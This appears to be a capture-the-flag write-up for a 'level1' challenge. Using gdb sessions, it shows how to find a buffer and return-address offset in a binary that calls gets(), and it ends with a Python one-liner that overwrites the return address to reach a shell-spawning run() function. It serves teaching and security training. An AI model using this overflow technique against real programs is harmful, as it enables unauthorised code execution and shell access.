## Buffer overflow with gets (level1)

This [binary](level1/source.c) uses gets() to fill a buffer from user input.
Gets is vulnerable since it does not check the buffer size when writing into it.
There is also a function run() which is not called by main but launches a shell.

All we have to do is to get the buffer address. Using gdb, I break in main just
before the gets call and get _eax_'s value:

```shell
# run gdb on the binary
gdb ./level1
# disassemble the main to get a look at the assembly code
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
# break before gets call
(gdb) b \*0x0804848d
Breakpoint 1 at 0x804848d
# start the program
(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x0804848d in main ()
# print eax
(gdb) x $eax
0xbffffb10:     0x080484a0
```

0xbffffb10 is the address inside the _eax_ register and 0x080484a0 is the value
at this address. To check that this is really the start of the buffer we can
fill it with some random text and print it after:

```shell
# break on the instruction after the gets() call
(gdb) b *0x08048495
# continue
(gdb) c
Continuing.
# input some string
some string

Breakpoint 3, 0x08048495 in main ()
# print the string from the start of the buffer
(gdb) p (char *)0xbffffb10
$6 = 0xbffffb10 "some string"
```

Now we must write some data to the buffer until we overwrite the return address
value. This is possible because the stack grows 'downwards' from the highest
memory addresses to the lowest and that the function's arguments and return
address are pushed to the stack before its local variables. So we know that the
local buffer will be situated before the return address in memory. The return
address on x86 systems is always situated at ebp's value + 4:

```shell
(gdb) x $ebp + 4
0xbffffb5c:     0xb7e454d3
# this checks out, since 0xbffffb5c is greater than 0xbffffb10.
```

This means that when the main function's execution will be done the next
instruction executed after the ret will be at 0xb7e454d3. What we want, to get
into the shell, is to replace this value with the run() function's address.
First get the address:

```shell
# info address returns the address of the given symbol
(gdb) i addr run
Symbol "run" is at 0x8048444 in a file compiled without debugging.
```

Then we have all we need to build our payload. The size of our buffer is equal
to the address of the return address minus the start of the buffer:
`bffffb5c-bffffb10 = 76`. This means that our payload should look like that:

| 0 ... 76    | 77 ... 80                  |
|-------------|----------------------------|
| filler data | run's address (0x08048444) |


```shell
# give the payload as input to level1
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' | ./level1
```

> Note that the return address bytes have been reversed since we're dealing with
> a little endian system.
